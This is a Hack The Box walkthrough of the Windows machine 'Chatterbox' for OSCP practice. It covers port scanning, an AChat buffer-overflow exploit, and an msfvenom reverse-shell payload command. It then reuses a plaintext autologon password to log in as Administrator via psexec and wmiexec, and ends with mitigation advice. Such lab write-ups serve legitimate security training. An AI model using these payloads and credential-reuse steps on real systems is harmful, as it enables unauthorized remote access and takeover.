---
title: Chatterbox
date: 2025-04-23
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, BOF, weak-creds-privesc] 
image: chatterbox.png
media_subpath: /assets/img/posts/2025-04-23-chatterboxHTB/
---
## Introduction
In this walkthrough we will be solving Hack The Box Medium Windows box Chatterbox. Let’s start ..

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check first 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```
![image.png](nmap.png)

## Services

### Port 139/445

**Windows 7 Professional** 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

```bash
smbclient -L //$IP/ -N
```

![image.png](image%202.png)

```bash
enum4linux $IP
```

**No result**

### Port 9256

**AChat chat system**

I don’t honestly know how to enumerate and how to do foot printing for this service that’s why I am gonna search for it. I found this exploit:

[Github](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/36025&ved=2ahUKEwjWx_-qgu6MAxXHxAIHHfFnKuMQFnoECCgQAQ&usg=AOvVaw2T57YwIcTiH4gJzYVC2l8o)

[https://github.com/mpgn/AChat-Reverse-TCP-Exploit](https://github.com/mpgn/AChat-Reverse-TCP-Exploit)

## Web

### Port 9255

AChat chat system httpd

**I couldn’t access the website.**

## Exploitation

[Github](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/36025&ved=2ahUKEwjWx_-qgu6MAxXHxAIHHfFnKuMQFnoECCgQAQ&usg=AOvVaw2T57YwIcTiH4gJzYVC2l8o)

[https://github.com/mpgn/AChat-Reverse-TCP-Exploit](https://github.com/mpgn/AChat-Reverse-TCP-Exploit)

![image.png](image%203.png)

I made a shellcode from bash script:

```bash
bash AChat_Payload.sh
```

I entered required values:

![image.png](image%204.png)

After that I changed shellcode in python exploit and changed server address to my target box address, then I run the exploit:

```bash
python AChat_Exploit.py
```

I got a connection back:

![image.png](image%205.png)

I was just losing my shell, so I decided to look at the bash script internals, I saw it is using meterpreter shell, so let’s change it to general shell.

```bash
cp AChat_Payload.sh [payload.sh](http://payload.sh/)
```

```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp RHOST=$RHOST LHOST=$LHOST LPORT=$LPORT exitfunc=thread -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

```

![image.png](image%206.png)

And I got a connection:

![image.png](image%207.png)

## Privilege Escalation

- **OSCP Checklist**
    
    https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/
    
    - [ ]  Situational Awareness 
    - [ ]  SeImpersonatePrivilege 
    - [ ]  SeBackupPrivilege 
    - [ ]  SeDebugPrivilege
    - [ ]  SeRestorePrivilege
    - [ ]  SeTakeOwnershipPrivilege 
    - [ ]  SeManageVolumePrivilege
    - [ ]  SeMachineAccountPrivilege
    - [ ]  [Full Privileges](https://itm4n.github.io/localservice-privileges/?source=post_page-----b95d3146cfe9---------------------------------------)
    - [ ]  [FullPowers](https://github.com/itm4n/FullPowers)
    - [ ]  PowerShell History(Transcription, Script Logging)
    - [ ]  Sensitive Files
    - [ ]  Insecure Service Executables
    - [ ]  binpath 
    - [ ]  DLL hijacking
    - [ ]  Unquoted Service Path
    - [ ]  Scheduled Tasks
    - [ ]  Application-based exploits
    - [ ]  [Detailed Paper about other privileges](https://github.com/hatRiot/token-priv)
    - [ ]  Kernel Exploits
    - [ ]  When you're on a Windows box make sure to check the root directory of the local drive volume, each user directory as well as their Desktop and Documents folders, the Program Files folder (usually the x86 one), as well as their PowerShell history if you want to be extra thorough. Do these before using something like winPEAS to save time if you end up finding a config file or script with credentials in it.
    
    ---
    
    [Privileged File Write EOP](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)
    

**I have done first some manual enumeration:**

![image.png](image%208.png)

**I run winPEASany.exe:**

![alfred](image%209.png)

alfred

![It is run with alfred user](image%2010.png)

It is run in the context of alfred user

![image.png](image%2011.png)

As I have found one password I am gonna try it for the Administrator user:

```bash
sudo nxc smb $IP -u Administrator -d . -p Welcome1!
```

![image.png](image%2012.png)

And it works !

Use [psexec.py](http://psexec.py)  to authenticate:

```bash
psexec.py Administrator:'Welcome1!'@10.10.10.74
```

![image.png](image%2013.png)



> Note: When running winPEAS I have noticed that Alfred had `AllAccess` on Administrator folders, that’s also a sign that Alfred is administrator he is just using two accounts on the machine.
{: .prompt-warning }


Ridiculously I cannot read `root.txt` as NT Authority\System.



> The `root.txt` file could have its **NTFS permissions explicitly denying access to SYSTEM** or only allowing access to `Administrator`. This is a deliberate CTF trick to make you escalate *context*, not just privilege.
{: .prompt-info }


I am gonna try to login as Administrator explicitly using not psexec but wmiexec as psexec automatically escalates privileges to nt authority\system.

```bash
wmiexec.py Administrator:'Welcome1!'@10.10.10.74
```

![image.png](image%2014.png)

Now we can read `root.txt`:

![image.png](image%2015.png)

## Mitigation

- **Patch Vulnerable Software**: The Achat application contains a known buffer overflow vulnerability. It should be removed or updated to a secure version. Legacy or unmaintained software should never be exposed to untrusted networks.
- **Disable Autologon**: Storing plaintext credentials in the registry (under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`) poses a serious risk. Autologon should be disabled, and sensitive credentials should never be stored in plaintext.
- **Least Privilege Enforcement**: The user `Alfred` had administrative rights, which allowed privilege escalation. Follow the principle of least privilege by only assigning administrative rights when strictly necessary.
- **Use of Credential Guard and LSA Protection**: Enable Credential Guard and LSA Protection on Windows systems to reduce the risk of credential theft via tools like Mimikatz or winPEAS.
